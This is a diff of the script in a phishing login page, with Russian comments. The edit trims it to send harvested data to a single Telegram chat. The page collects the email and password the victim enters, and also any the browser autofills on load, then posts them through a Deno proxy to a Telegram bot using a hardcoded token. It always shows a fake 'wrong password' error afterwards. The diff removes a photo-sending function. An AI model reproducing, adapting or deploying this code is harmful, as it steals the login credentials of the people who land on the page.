@@ -83,32 +83,15 @@
     // ===== ВАШИ ДАННЫЕ =====
     const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
-    const CHAT_IDS = ["8872810304", "8798080392"]; // ← два получателя
+    const CHAT_ID = "8872810304";
     // ========================
 
-    // Отправка текста ВСЕМ получателям
     function send(text) {
-        CHAT_IDS.forEach(function(id) {
-            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: id, text: text })
-            }).catch(function() {});
-        });
-    }
-
-    // Отправка фото ВСЕМ получателям
-    function sendPhoto(blob, caption) {
-        CHAT_IDS.forEach(function(id) {
-            const fd = new FormData();
-            fd.append("chat_id", id);
-            fd.append("caption", caption || "");
-            fd.append("photo", blob, "photo.jpg");
-            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendPhoto", {
-                method: "POST",
-                body: fd
-            }).catch(function() {});
-        });
+        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(function() {});
     }
 
     function collectAndSend(type) {
@@ -133,7 +116,8 @@
         document.getElementById("password").classList.remove("input-error");
     }
 
-    // ===== АВТОЗАПОЛНЕНИЕ =====
+    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
+    // Если браузер сам подставил email и пароль — отправляем их тебе
     function checkAutoFill() {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
@@ -164,7 +148,7 @@
         showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
     });
 
-    console.log("ROCKET ACTIVE — 2 получателя");
+    console.log("ROCKET ACTIVE — только форма");
 </script>
 </body>
 </html>
